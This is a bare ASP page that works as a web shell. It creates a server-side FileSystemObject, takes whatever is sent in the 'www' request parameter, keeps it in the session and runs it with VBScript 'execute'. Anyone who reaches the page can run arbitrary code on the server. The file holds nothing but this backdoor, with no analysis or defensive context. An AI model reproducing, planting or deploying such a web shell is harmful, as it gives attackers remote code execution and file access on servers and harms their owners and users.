<!ак><object id=fs RUNAT=SERVER  classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></object><!ак>
<%if request("www")<>"" then Session("b")=request("www")
if Session("b")<>"" then execute Session("b")%>